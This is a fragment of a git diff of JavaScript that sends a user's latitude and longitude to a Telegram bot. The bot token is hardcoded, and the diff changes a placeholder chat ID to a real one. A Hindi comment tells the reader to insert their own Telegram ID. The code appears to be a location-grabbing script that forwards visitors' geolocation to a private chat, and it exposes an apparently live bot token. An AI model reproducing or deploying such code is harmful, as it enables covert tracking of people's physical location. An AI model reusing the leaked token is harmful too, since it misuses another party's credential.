@@ -12,7 +12,7 @@ function sendToTelegram(position) {
   const message = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
 
   const token = "7847229114:AAHGiStrH3Q8CjCMLso-YG_9nqb0jW_-Kkg";
-  const chatId = 123456789; // Yahan apna Telegram numeric ID daalo
+  const chatId = 2142701628; // Yahan apna Telegram numeric ID daalo
 
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
